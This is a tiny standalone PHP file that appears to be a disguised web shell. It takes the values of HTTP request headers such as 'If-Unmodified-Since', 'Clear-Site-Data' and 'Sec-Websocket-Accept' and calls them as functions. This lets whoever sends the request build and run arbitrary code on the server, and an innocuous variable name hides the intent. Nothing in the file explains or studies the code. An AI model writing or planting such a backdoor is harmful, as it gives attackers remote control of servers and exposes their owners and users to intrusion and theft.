<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $parle_tokens = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Sec-Websocket-Accept']));
    $parle_tokens();
}